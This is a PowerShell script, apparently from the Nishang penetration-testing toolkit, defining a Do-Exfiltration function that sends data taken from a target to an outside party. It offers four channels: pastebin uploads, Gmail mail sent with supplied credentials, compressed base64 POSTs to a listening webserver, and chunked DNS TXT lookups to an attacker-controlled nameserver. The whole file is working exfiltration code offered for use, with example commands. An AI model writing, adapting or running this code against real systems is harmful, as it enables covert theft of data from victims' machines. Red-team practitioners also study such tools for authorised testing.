<#
.SYNOPSIS
Use this script to exfiltrate data from a target.

.DESCRIPTION
This script could be used to exfiltrate data from a target to gmail, pastebin, a webserver which could log POST requests
and a DNS Server which could log TXT queries. To decode the data exfiltrated by webserver and DNS methods use Invoke-Decode.ps1 
in Utility folder of Nishang.

.PARAMETER Data
The data to be exfiltrated. Could be supplied by pipeline. 

.PARAMETER ExfilOption
The method you want to use for exfitration of data. Valid options are "gmail","pastebin","WebServer" and "DNS".

.PARAMETER dev_key
The Unique API key provided by pastebin when you register a free account.
Unused for other options

.PARAMETER username
Username for the pastebin/gmail account where data would be exfiltrated.
Unused for other options

.PARAMETER password
Password for the pastebin/gmail account where data would be exfiltrated.
Unused for other options

.PARAMETER URL
The URL of the webserver where POST requests would be sent.

.PARAMETER DomainName
The DomainName, whose subdomains would be used for sending TXT queries to.

.PARAMETER AuthNS
Authoritative Name Server for the domain specified in DomainName


.EXAMPLE
PS > Get-Information | Do-Exfiltration -ExfilOption gmail -username <> -Password <>

Use above command for data exfiltration to gmail

.EXAMPLE
PS > Get-Information | Do-Exfiltration -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php

Use above command for data exfiltration to a webserver which logs POST requests.


.EXAMPLE
PS > Get-Information | Do-Exfiltration -ExfilOption DNS -DomainName example.com -AuthNS 192.168.254.228

Use above command for data exfiltration to a DNS server which logs TXT queries.


.LINK
http://labofapenetrationtester.com/
https://github.com/samratashok/nishang
#>

function Do-Exfiltration
{
    [CmdletBinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeLine = $True)] 
        [String]
        $Data,
        
        [Parameter(Position = 1, Mandatory = $True)] [ValidateSet("gmail","pastebin","WebServer","DNS")]
        [String]
        $ExfilOption,

        [Parameter(Position = 2, Mandatory = $False)] 
        [String]
        $dev_key,

        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $username,

        [Parameter(Position = 4, Mandatory = $False)]
        [String]
        $password,

        [Parameter(Position = 5, Mandatory = $False)]
        [String]
        $URL,
      
        [Parameter(Position = 6, Mandatory = $False)]
        [String]
        $DomainName,

        [Parameter(Position = 7, Mandatory = $False)]
        [String]
        $AuthNS
    )

    function post_http($url,$parameters) 
    { 
        $http_request = New-Object -ComObject Msxml2.XMLHTTP 
        $http_request.open("POST", $url, $false) 
        $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
        $http_request.setRequestHeader("Content-length", $parameters.length); 
        $http_request.setRequestHeader("Connection", "close") 
        $http_request.send($parameters) 
        $script:session_key=$http_request.responseText 
    } 

    function Compress-Encode
    {
        #Compression logic from http://blog.karstein-consulting.com/2010/10/19/how-to-embedd-compressed-scripts-in-other-powershell-scripts/
        $encdata = [string]::Join("`n", $Data)
        $ms = New-Object System.IO.MemoryStream
        $cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
        $sw = New-Object System.IO.StreamWriter($cs)
        $sw.Write($encdata)
        $sw.Close();
        $Compressed = [Convert]::ToBase64String($ms.ToArray())
        $Compressed
    }

    if ($exfiloption -eq "pastebin")
    {
        $utfbytes  = [System.Text.Encoding]::UTF8.GetBytes($Data)
        $pastevalue = [System.Convert]::ToBase64String($utfbytes)
        $pastename = "Exfiltrated Data"
        post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
        post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$pastename&api_paste_code=$pastevalue&api_paste_private=2" 
    }
        
    elseif ($exfiloption -eq "gmail")
    {
        #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
        $smtpserver = “smtp.gmail.com”
        $msg = new-object Net.Mail.MailMessage
        $smtp = new-object Net.Mail.SmtpClient($smtpServer )
        $smtp.EnableSsl = $True
        $smtp.Credentials = New-Object System.Net.NetworkCredential(“$username”, “$password”); 
        $msg.From = “$username@gmail.com”
        $msg.To.Add(”$username@gmail.com”)
        $msg.Subject = "Exfiltrated Data"
        $msg.Body = $Data
        if ($filename)
        {
            $att = new-object Net.Mail.Attachment($filename)
            $msg.Attachments.Add($att)
        }
        $smtp.Send($msg)
    }

    elseif ($exfiloption -eq "webserver")
    {
        $Data = Compress-Encode    
        post_http $URL $Data
    }
    elseif ($ExfilOption -eq "DNS")
    {
        $code = Compress-Encode
        $queries = [int]($code.Length/63)
        while ($queries -ne 0)
        {
            $querystring = $code.Substring($lengthofsubstr,63)
            Invoke-Expression "nslookup -querytype=txt $querystring.$DomainName $AuthNS"
            $lengthofsubstr += 63
            $queries -= 1
        }
        $mod = $code.Length%63
        $query = $code.Substring($code.Length - $mod, $mod)
        Invoke-Expression "nslookup -querytype=txt $query.$DomainName $AuthNS"

    }

}